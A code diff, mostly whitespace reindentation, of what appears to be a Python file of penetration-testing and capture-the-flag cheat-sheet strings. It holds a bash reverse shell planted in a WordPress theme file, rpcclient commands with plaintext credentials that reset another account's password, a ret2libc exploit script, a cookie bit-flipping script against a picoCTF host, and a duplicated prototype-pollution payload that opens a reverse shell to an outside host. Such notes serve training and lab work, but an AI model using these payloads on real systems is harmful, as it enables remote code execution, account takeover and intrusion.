+    │   ├── ./wordpress/wp-admin/site-health.php
+    │   ├── ./wordpress/wp-admin/term.php
+    │   ├── ./wordpress/wp-admin/theme-editor.php
+    │   ├── ./wordpress/wp-admin/theme-install.php
+    │   ├── ./wordpress/wp-admin/themes.php
+    │   ├── ./wordpress/wp-admin/tools.php
+    │   ├── ./wordpress/wp-admin/update-core.php
+    │   ├── ./wordpress/wp-admin/update.php
+    │   ├── ./wordpress/wp-admin/upgrade-functions.php
+    │   ├── ./wordpress/wp-admin/upgrade.php
+    │   ├── ./wordpress/wp-admin/upload.php
+    │   ├── ./wordpress/wp-admin/user-edit.php
+    │   ├── ./wordpress/wp-admin/user-new.php
+    │   ├── ./wordpress/wp-admin/users.php
+    │   ├── ./wordpress/wp-admin/widgets-form-blocks.php
+    │   ├── ./wordpress/wp-admin/widgets-form.php
+    │   └── ./wordpress/wp-admin/widgets.php
+    ├── ./wordpress/wp-content
+    │   ├── ./wordpress/wp-content/plugins
+    │   ├── ./wordpress/wp-content/themes
+    │   └── ./wordpress/wp-content/index.php
+    ├── ./wordpress/wp-includes
+    │   ├── ./wordpress/wp-includes/assets
+    │   ├── ./wordpress/wp-includes/block-patterns
+    │   ├── ./wordpress/wp-includes/blocks
+    │   ├── ./wordpress/wp-includes/block-supports
+    │   ├── ./wordpress/wp-includes/certificates
+    │   ├── ./wordpress/wp-includes/css
+    │   ├── ./wordpress/wp-includes/customize
+    │   ├── ./wordpress/wp-includes/fonts
+    │   ├── ./wordpress/wp-includes/ID3
+    │   ├── ./wordpress/wp-includes/images
+    │   ├── ./wordpress/wp-includes/IXR
+    │   ├── ./wordpress/wp-includes/js
+    │   ├── ./wordpress/wp-includes/PHPMailer
+    │   ├── ./wordpress/wp-includes/pomo
+    │   ├── ./wordpress/wp-includes/random_compat
+    │   ├── ./wordpress/wp-includes/Requests
+    │   ├── ./wordpress/wp-includes/rest-api
+    │   ├── ./wordpress/wp-includes/SimplePie
+    │   ├── ./wordpress/wp-includes/sitemaps
+    │   ├── ./wordpress/wp-includes/sodium_compat
+    │   ├── ./wordpress/wp-includes/Text
+    │   ├── ./wordpress/wp-includes/theme-compat
+    │   ├── ./wordpress/wp-includes/widgets
+    │   ├── ./wordpress/wp-includes/admin-bar.php
+    │   ├── ./wordpress/wp-includes/atomlib.php
+    │   ├── ./wordpress/wp-includes/author-template.php
+    │   ├── ./wordpress/wp-includes/block-editor.php
+    │   ├── ./wordpress/wp-includes/block-patterns.php
+    │   ├── ./wordpress/wp-includes/blocks.php
+    │   ├── ./wordpress/wp-includes/block-template.php
+    │   ├── ./wordpress/wp-includes/block-template-utils.php
+    │   ├── ./wordpress/wp-includes/bookmark.php
+    │   ├── ./wordpress/wp-includes/bookmark-template.php
+    │   ├── ./wordpress/wp-includes/cache-compat.php
+    │   ├── ./wordpress/wp-includes/cache.php
+    │   ├── ./wordpress/wp-includes/canonical.php
+    │   ├── ./wordpress/wp-includes/capabilities.php
+    │   ├── ./wordpress/wp-includes/category.php
+    │   ├── ./wordpress/wp-includes/category-template.php
+    │   ├── ./wordpress/wp-includes/class-feed.php
+    │   ├── ./wordpress/wp-includes/class-http.php
+    │   ├── ./wordpress/wp-includes/class-IXR.php
+    │   ├── ./wordpress/wp-includes/class-json.php
+    │   ├── ./wordpress/wp-includes/class-oembed.php
+    │   ├── ./wordpress/wp-includes/class-phpass.php
+    │   ├── ./wordpress/wp-includes/class-phpmailer.php
+    │   ├── ./wordpress/wp-includes/class-pop3.php
+    │   ├── ./wordpress/wp-includes/class-requests.php
+    │   ├── ./wordpress/wp-includes/class-simplepie.php
+    │   ├── ./wordpress/wp-includes/class-smtp.php
+    │   ├── ./wordpress/wp-includes/class-snoopy.php
+    │   ├── ./wordpress/wp-includes/class-walker-category-dropdown.php
+    │   ├── ./wordpress/wp-includes/class-walker-category.php
+    │   ├── ./wordpress/wp-includes/class-walker-comment.php
+    │   ├── ./wordpress/wp-includes/class-walker-nav-menu.php
+    │   ├── ./wordpress/wp-includes/class-walker-page-dropdown.php
+    │   ├── ./wordpress/wp-includes/class-walker-page.php
+    │   ├── ./wordpress/wp-includes/class-wp-admin-bar.php
+    │   ├── ./wordpress/wp-includes/class-wp-ajax-response.php
+    │   ├── ./wordpress/wp-includes/class-wp-application-passwords.php
+    │   ├── ./wordpress/wp-includes/class-wp-block-editor-context.php
+    │   ├── ./wordpress/wp-includes/class-wp-block-list.php
+    │   ├── ./wordpress/wp-includes/class-wp-block-parser.php
+    │   ├── ./wordpress/wp-includes/class-wp-block-pattern-categories-registry.php
+    │   ├── ./wordpress/wp-includes/class-wp-block-patterns-registry.php
+    │   ├── ./wordpress/wp-includes/class-wp-block.php
+    │   ├── ./wordpress/wp-includes/class-wp-block-styles-registry.php
+    │   ├── ./wordpress/wp-includes/class-wp-block-supports.php
+    │   ├── ./wordpress/wp-includes/class-wp-block-template.php
+    │   ├── ./wordpress/wp-includes/class-wp-block-type.php
+    │   ├── ./wordpress/wp-includes/class-wp-block-type-registry.php
+    │   ├── ./wordpress/wp-includes/class-wp-comment.php
+    │   ├── ./wordpress/wp-includes/class-wp-comment-query.php
+    │   ├── ./wordpress/wp-includes/class-wp-customize-control.php
+    │   ├── ./wordpress/wp-includes/class-wp-customize-manager.php
+    │   ├── ./wordpress/wp-includes/class-wp-customize-nav-menus.php
+    │   ├── ./wordpress/wp-includes/class-wp-customize-panel.php
+    │   ├── ./wordpress/wp-includes/class-wp-customize-section.php
+    │   ├── ./wordpress/wp-includes/class-wp-customize-setting.php
+    │   ├── ./wordpress/wp-includes/class-wp-customize-widgets.php
+    │   ├── ./wordpress/wp-includes/class-wp-date-query.php
+    │   ├── ./wordpress/wp-includes/class.wp-dependencies.php
+    │   ├── ./wordpress/wp-includes/class-wp-dependency.php
+    │   ├── ./wordpress/wp-includes/class-wp-editor.php
+    │   ├── ./wordpress/wp-includes/class-wp-embed.php
+    │   ├── ./wordpress/wp-includes/class-wp-error.php
+    │   ├── ./wordpress/wp-includes/class-wp-fatal-error-handler.php
+    │   ├── ./wordpress/wp-includes/class-wp-feed-cache.php
+    │   ├── ./wordpress/wp-includes/class-wp-feed-cache-transient.php
+    │   ├── ./wordpress/wp-includes/class-wp-hook.php
+    │   ├── ./wordpress/wp-includes/class-wp-http-cookie.php
+    │   ├── ./wordpress/wp-includes/class-wp-http-curl.php
+    │   ├── ./wordpress/wp-includes/class-wp-http-encoding.php
+    │   ├── ./wordpress/wp-includes/class-wp-http-ixr-client.php
+    │   ├── ./wordpress/wp-includes/class-wp-http-proxy.php
+    │   ├── ./wordpress/wp-includes/class-wp-http-requests-hooks.php
+    │   ├── ./wordpress/wp-includes/class-wp-http-requests-response.php
+    │   ├── ./wordpress/wp-includes/class-wp-http-response.php
+    │   ├── ./wordpress/wp-includes/class-wp-http-streams.php
+    │   ├── ./wordpress/wp-includes/class-wp-image-editor-gd.php
+    │   ├── ./wordpress/wp-includes/class-wp-image-editor-imagick.php
+    │   ├── ./wordpress/wp-includes/class-wp-image-editor.php
+    │   ├── ./wordpress/wp-includes/class-wp-list-util.php
+    │   ├── ./wordpress/wp-includes/class-wp-locale.php
+    │   ├── ./wordpress/wp-includes/class-wp-locale-switcher.php
+    │   ├── ./wordpress/wp-includes/class-wp-matchesmapregex.php
+    │   ├── ./wordpress/wp-includes/class-wp-metadata-lazyloader.php
+    │   ├── ./wordpress/wp-includes/class-wp-meta-query.php
+    │   ├── ./wordpress/wp-includes/class-wp-network.php
+    │   ├── ./wordpress/wp-includes/class-wp-network-query.php
+    │   ├── ./wordpress/wp-includes/class-wp-object-cache.php
+    │   ├── ./wordpress/wp-includes/class-wp-oembed-controller.php
+    │   ├── ./wordpress/wp-includes/class-wp-oembed.php
+    │   ├── ./wordpress/wp-includes/class-wp-paused-extensions-storage.php
+    │   ├── ./wordpress/wp-includes/class-wp.php
+    │   ├── ./wordpress/wp-includes/class-wp-post.php
+    │   ├── ./wordpress/wp-includes/class-wp-post-type.php
+    │   ├── ./wordpress/wp-includes/class-wp-query.php
+    │   ├── ./wordpress/wp-includes/class-wp-recovery-mode-cookie-service.php
+    │   ├── ./wordpress/wp-includes/class-wp-recovery-mode-email-service.php
+    │   ├── ./wordpress/wp-includes/class-wp-recovery-mode-key-service.php
+    │   ├── ./wordpress/wp-includes/class-wp-recovery-mode-link-service.php
+    │   ├── ./wordpress/wp-includes/class-wp-recovery-mode.php
+    │   ├── ./wordpress/wp-includes/class-wp-rewrite.php
+    │   ├── ./wordpress/wp-includes/class-wp-role.php
+    │   ├── ./wordpress/wp-includes/class-wp-roles.php
+    │   ├── ./wordpress/wp-includes/class.wp-scripts.php
+    │   ├── ./wordpress/wp-includes/class-wp-session-tokens.php
+    │   ├── ./wordpress/wp-includes/class-wp-simplepie-file.php
+    │   ├── ./wordpress/wp-includes/class-wp-simplepie-sanitize-kses.php
+    │   ├── ./wordpress/wp-includes/class-wp-site.php
+    │   ├── ./wordpress/wp-includes/class-wp-site-query.php
+    │   ├── ./wordpress/wp-includes/class.wp-styles.php
+    │   ├── ./wordpress/wp-includes/class-wp-taxonomy.php
+    │   ├── ./wordpress/wp-includes/class-wp-tax-query.php
+    │   ├── ./wordpress/wp-includes/class-wp-term.php
+    │   ├── ./wordpress/wp-includes/class-wp-term-query.php
+    │   ├── ./wordpress/wp-includes/class-wp-text-diff-renderer-inline.php
+    │   ├── ./wordpress/wp-includes/class-wp-text-diff-renderer-table.php
+    │   ├── ./wordpress/wp-includes/class-wp-theme-json.php
+    │   ├── ./wordpress/wp-includes/class-wp-theme-json-resolver.php
+    │   ├── ./wordpress/wp-includes/class-wp-theme.php
+    │   ├── ./wordpress/wp-includes/class-wp-user-meta-session-tokens.php
+    │   ├── ./wordpress/wp-includes/class-wp-user.php
+    │   ├── ./wordpress/wp-includes/class-wp-user-query.php
+    │   ├── ./wordpress/wp-includes/class-wp-user-request.php
+    │   ├── ./wordpress/wp-includes/class-wp-walker.php
+    │   ├── ./wordpress/wp-includes/class-wp-widget-factory.php
+    │   ├── ./wordpress/wp-includes/class-wp-widget.php
+    │   ├── ./wordpress/wp-includes/class-wp-xmlrpc-server.php
+    │   ├── ./wordpress/wp-includes/comment.php
+    │   ├── ./wordpress/wp-includes/comment-template.php
+    │   ├── ./wordpress/wp-includes/compat.php
+    │   ├── ./wordpress/wp-includes/cron.php
+    │   ├── ./wordpress/wp-includes/date.php
+    │   ├── ./wordpress/wp-includes/default-constants.php
+    │   ├── ./wordpress/wp-includes/default-filters.php
+    │   ├── ./wordpress/wp-includes/default-widgets.php
+    │   ├── ./wordpress/wp-includes/deprecated.php
+    │   ├── ./wordpress/wp-includes/embed.php
+    │   ├── ./wordpress/wp-includes/embed-template.php
+    │   ├── ./wordpress/wp-includes/error-protection.php
+    │   ├── ./wordpress/wp-includes/feed-atom-comments.php
+    │   ├── ./wordpress/wp-includes/feed-atom.php
+    │   ├── ./wordpress/wp-includes/feed.php
+    │   ├── ./wordpress/wp-includes/feed-rdf.php
+    │   ├── ./wordpress/wp-includes/feed-rss2-comments.php
+    │   ├── ./wordpress/wp-includes/feed-rss2.php
+    │   ├── ./wordpress/wp-includes/feed-rss.php
+    │   ├── ./wordpress/wp-includes/formatting.php
+    │   ├── ./wordpress/wp-includes/functions.php
+    │   ├── ./wordpress/wp-includes/functions.wp-scripts.php
+    │   ├── ./wordpress/wp-includes/functions.wp-styles.php
+    │   ├── ./wordpress/wp-includes/general-template.php
+    │   ├── ./wordpress/wp-includes/http.php
+    │   ├── ./wordpress/wp-includes/https-detection.php
+    │   ├── ./wordpress/wp-includes/https-migration.php
+    │   ├── ./wordpress/wp-includes/kses.php
+    │   ├── ./wordpress/wp-includes/l10n.php
+    │   ├── ./wordpress/wp-includes/link-template.php
+    │   ├── ./wordpress/wp-includes/load.php
+    │   ├── ./wordpress/wp-includes/locale.php
+    │   ├── ./wordpress/wp-includes/media.php
+    │   ├── ./wordpress/wp-includes/media-template.php
+    │   ├── ./wordpress/wp-includes/meta.php
+    │   ├── ./wordpress/wp-includes/ms-blogs.php
+    │   ├── ./wordpress/wp-includes/ms-default-constants.php
+    │   ├── ./wordpress/wp-includes/ms-default-filters.php
+    │   ├── ./wordpress/wp-includes/ms-deprecated.php
+    │   ├── ./wordpress/wp-includes/ms-files.php
+    │   ├── ./wordpress/wp-includes/ms-functions.php
+    │   ├── ./wordpress/wp-includes/ms-load.php
+    │   ├── ./wordpress/wp-includes/ms-network.php
+    │   ├── ./wordpress/wp-includes/ms-settings.php
+    │   ├── ./wordpress/wp-includes/ms-site.php
+    │   ├── ./wordpress/wp-includes/nav-menu.php
+    │   ├── ./wordpress/wp-includes/nav-menu-template.php
+    │   ├── ./wordpress/wp-includes/option.php
+    │   ├── ./wordpress/wp-includes/pluggable-deprecated.php
+    │   ├── ./wordpress/wp-includes/pluggable.php
+    │   ├── ./wordpress/wp-includes/plugin.php
+    │   ├── ./wordpress/wp-includes/post-formats.php
+    │   ├── ./wordpress/wp-includes/post.php
+    │   ├── ./wordpress/wp-includes/post-template.php
+    │   ├── ./wordpress/wp-includes/post-thumbnail-template.php
+    │   ├── ./wordpress/wp-includes/query.php
+    │   ├── ./wordpress/wp-includes/registration-functions.php
+    │   ├── ./wordpress/wp-includes/registration.php
+    │   ├── ./wordpress/wp-includes/rest-api.php
+    │   ├── ./wordpress/wp-includes/revision.php
+    │   ├── ./wordpress/wp-includes/rewrite.php
+    │   ├── ./wordpress/wp-includes/robots-template.php
+    │   ├── ./wordpress/wp-includes/rss-functions.php
+    │   ├── ./wordpress/wp-includes/rss.php
+    │   ├── ./wordpress/wp-includes/script-loader.php
+    │   ├── ./wordpress/wp-includes/session.php
+    │   ├── ./wordpress/wp-includes/shortcodes.php
+    │   ├── ./wordpress/wp-includes/sitemaps.php
+    │   ├── ./wordpress/wp-includes/spl-autoload-compat.php
+    │   ├── ./wordpress/wp-includes/taxonomy.php
+    │   ├── ./wordpress/wp-includes/template-canvas.php
+    │   ├── ./wordpress/wp-includes/template-loader.php
+    │   ├── ./wordpress/wp-includes/template.php
+    │   ├── ./wordpress/wp-includes/theme-i18n.json
+    │   ├── ./wordpress/wp-includes/theme.json
+    │   ├── ./wordpress/wp-includes/theme.php
+    │   ├── ./wordpress/wp-includes/theme-templates.php
+    │   ├── ./wordpress/wp-includes/update.php
+    │   ├── ./wordpress/wp-includes/user.php
+    │   ├── ./wordpress/wp-includes/vars.php
+    │   ├── ./wordpress/wp-includes/version.php
+    │   ├── ./wordpress/wp-includes/widgets.php
+    │   ├── ./wordpress/wp-includes/wlwmanifest.xml
+    │   ├── ./wordpress/wp-includes/wp-db.php
+    │   └── ./wordpress/wp-includes/wp-diff.php
+    ├── ./wordpress/index.php
+    ├── ./wordpress/license.txt
+    ├── ./wordpress/readme.html
+    ├── ./wordpress/wp-activate.php
+    ├── ./wordpress/wp-blog-header.php
+    ├── ./wordpress/wp-comments-post.php
+    ├── ./wordpress/wp-config-sample.php
+    ├── ./wordpress/wp-cron.php
+    ├── ./wordpress/wp-links-opml.php
+    ├── ./wordpress/wp-load.php
+    ├── ./wordpress/wp-login.php
+    ├── ./wordpress/wp-mail.php
+    ├── ./wordpress/wp-settings.php
+    ├── ./wordpress/wp-signup.php
+    ├── ./wordpress/wp-trackback.php
+    └── ./wordpress/xmlrpc.php
 
 36 directories, 320 files
 """
@@ -1345,7 +1345,7 @@ reverseShellWordpress.output = """[*] When authenticated, we can change the Word
 http://10.10.10.37/wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen&scrollto=0
 
 # Put something like a RCE, or a reverse shell directely in between the 404.php code...
-	system("bash -c 'bash -i >& /dev/tcp/10.10.14.53/443 0>&1'");
+    system("bash -c 'bash -i >& /dev/tcp/10.10.14.53/443 0>&1'");
 
 # Access to 404.php
 http://10.10.10.37/?p=404.php # Or http://10.10.10.37/?p=404.php&cmd=whoami if is a RCE
@@ -1615,8 +1615,8 @@ echo; rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "querygr
 
 # If a user has the capability to change another user's passwordChange without knowing that user's current password, then:
 rpcclient -U "support%!00^BlackKnight" 10.10.10.192
-	{Color.GRAY}rpcclient $>{Color.RESET}  # setuserinfo2 username level new_password
-	{Color.GRAY}rpcclient $>{Color.RESET} setuserinfo2 audit2020 24 J4v4li123$!
+    {Color.GRAY}rpcclient $>{Color.RESET}  # setuserinfo2 username level new_password
+    {Color.GRAY}rpcclient $>{Color.RESET} setuserinfo2 audit2020 24 J4v4li123$!
 """
 
 ######################################
@@ -1951,12 +1951,12 @@ TO = "syjulio123@gmail.com"
 FROM = "testingPostMail@hotmail.com"
 TEXT = "This is a test email"
 BODY = "\n".join((
-	f"From: {FROM}",
-	f"To: {TO}",
-	f"Subject: {SUBJECT}",
-	"",
-	TEXT, 
-	"\r\n"))
+    f"From: {FROM}",
+    f"To: {TO}",
+    f"Subject: {SUBJECT}",
+    "",
+    TEXT, 
+    "\r\n"))
 
 server = smtplib.SMTP(HOST)
 server.sendmail(FROM, [TO], BODY)
@@ -1998,14 +1998,14 @@ gdb ./binary.elf
 
 gef> run $(python -c 'print("A"*100)')
 get> pattern create 100
-	[+] Generating a pattern of 100 bytes (n=4)
-	aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
-	[+] Saved as '$_gef0'
+    [+] Generating a pattern of 100 bytes (n=4)
+    aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+    [+] Saved as '$_gef0'
 gef> run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
 gef> pattern offset $eip
-	[+] Searching for '$eip'
-	[+] Found at offset 52 (little-endian search) likely
-	[+] Found at offset 49 (big-endian search)
+    [+] Searching for '$eip'
+    [+] Found at offset 52 (little-endian search) likely
+    [+] Found at offset 49 (big-endian search)
 
 # check if we really control the EIP address
 gef> run $(python -c 'print("A" * 52 + "BBBB")')
@@ -2017,30 +2017,30 @@ import os, sys
 
 
 def getLibcAddr():
-	return int(os.popen("ldd /home/ayush/.binary/rop | grep libc | awk 'NF{print$NF}' | tr -d '()'").read().strip(), 16)
+    return int(os.popen("ldd /home/ayush/.binary/rop | grep libc | awk 'NF{print$NF}' | tr -d '()'").read().strip(), 16)
 
 def getSystemAddrOff():
-	return int(os.popen("readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' system@@' | awk '{print$2}'").read().strip(), 16)
+    return int(os.popen("readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' system@@' | awk '{print$2}'").read().strip(), 16)
 
 def getExitAddrOff():
-	return int(os.popen("readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' exit@@' | awk '{print$2}'").read().strip(), 16)
+    return int(os.popen("readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' exit@@' | awk '{print$2}'").read().strip(), 16)
 
 def getBinShAddrOff():
-	return int(os.popen("strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh' | awk '{print$1}'").read().strip(), 16)
+    return int(os.popen("strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh' | awk '{print$1}'").read().strip(), 16)
 
 def mostFrequent(List):
-	detailed_dict = {}
-	count = 0
-	mostFrequentItem = ''
-	for item in List:
-		detailed_dict[item] = detailed_dict.get(item, 0) + 1
-		if detailed_dict[item] >= count:
-			count = detailed_dict[item]
-			mostFrequentItem = item
-	return(mostFrequentItem)
+    detailed_dict = {}
+    count = 0
+    mostFrequentItem = ''
+    for item in List:
+        detailed_dict[item] = detailed_dict.get(item, 0) + 1
+        if detailed_dict[item] >= count:
+            count = detailed_dict[item]
+            mostFrequentItem = item
+    return(mostFrequentItem)
 
 def p32(num):
-	return pack("<I",num)
+    return pack("<I",num)
 
 
 baseLibc = mostFrequent([getLibcAddr() for i in range(1000)])
@@ -2058,9 +2058,9 @@ payload += p32(exitAddr)
 payload += p32(binShAddr) 
 
 while True:
-	res = os.system(b"/home/ayush/.binary/rop " + payload)
-	if res == 0:
-		sys.exit(0)
+    res = os.system(b"/home/ayush/.binary/rop " + payload)
+    if res == 0:
+        sys.exit(0)
 """
 
 ######################################
@@ -2365,14 +2365,14 @@ from pwn import *
 
 
 def get_legible_info_from_memleak(raw_leak: str):
-	res = ''
-	raw_leak = raw_leak.replace("(nil)", "").split()
-	for element in raw_leak:
-		try:
-			res += p32(int(element, 16)).decode()
-		except:
-			pass
-	return res
+    res = ''
+    raw_leak = raw_leak.replace("(nil)", "").split()
+    for element in raw_leak:
+        try:
+            res += p32(int(element, 16)).decode()
+        except:
+            pass
+    return res
 
 # def get_legible_info_from_memleak(raw_leak: str):
 
@@ -2443,16 +2443,16 @@ from base64 import b64decode, b64encode
 
 # Functions
 def getCookie(url):
-	s = requests.Session()
-	s.get(url)
-	return s.cookies.get_dict()["auth_name"]
+    s = requests.Session()
+    s.get(url)
+    return s.cookies.get_dict()["auth_name"]
 
 
 def bit_flip(pos, bit, cookie):
-	data = b64decode(b64decode(cookie))
-	data = bytearray(data)
-	data[pos] ^= bit
-	return b64encode(b64encode(data)).decode()
+    data = b64decode(b64decode(cookie))
+    data = bytearray(data)
+    data[pos] ^= bit
+    return b64encode(b64encode(data)).decode()
 
 
 
@@ -2461,12 +2461,12 @@ url = "http://mercury.picoctf.net:25992/"
 cookie = getCookie(url)
 
 for i in range(10):
-	for j in range(256):
-		cookie = bit_flip(i, j, cookie)
-		r = requests.get(url, cookies={"auth_name": cookie})
-		if "picoCTF{" in r.text:
-			print(r.text)
-			exit(0)
+    for j in range(256):
+        cookie = bit_flip(i, j, cookie)
+        r = requests.get(url, cookies={"auth_name": cookie})
+        if "picoCTF{" in r.text:
+            print(r.text)
+            exit(0)
 
 """
 
@@ -2536,19 +2536,19 @@ TARGET_URL = 'http://p6.is:3000'
 
 # make pollution
 requests.post(TARGET_URL + '/vulnerable', json = {
-	"__proto__.type": "Program",
-	"__proto__.body": [{
-		"type": "MustacheStatement",
-		"path": 0,
-		"params": [{
-			"type": "NumberLiteral",
-			"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
-		}],
-		"loc": {
-			"start": 0,
-			"end": 0
-		}
-	}]
+    "__proto__.type": "Program",
+    "__proto__.body": [{
+        "type": "MustacheStatement",
+        "path": 0,
+        "params": [{
+            "type": "NumberLiteral",
+            "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
+        }],
+        "loc": {
+            "start": 0,
+            "end": 0
+        }
+    }]
 })
 
 # execute
@@ -2563,19 +2563,19 @@ TARGET_URL = 'http://p6.is:3000'
 
 # make pollution
 requests.post(TARGET_URL + '/vulnerable', json = {
-	"__proto__.type": "Program",
-	"__proto__.body": [{
-		"type": "MustacheStatement",
-		"path": 0,
-		"params": [{
-			"type": "NumberLiteral",
-			"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
-		}],
-		"loc": {
-			"start": 0,
-			"end": 0
-		}
-	}]
+    "__proto__.type": "Program",
+    "__proto__.body": [{
+        "type": "MustacheStatement",
+        "path": 0,
+        "params": [{
+            "type": "NumberLiteral",
+            "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
+        }],
+        "loc": {
+            "start": 0,
+            "end": 0
+        }
+    }]
 })
 
 # execute
@@ -2966,4 +2966,6 @@ router rip
 version 2
 network <network>  # ipv4
 passive-interface <interface>  # ipv4
+
+default-information originate  # ipv4 NEED ip route 0.0.0.0 0.0.0.0 <interface para a internet>
 """
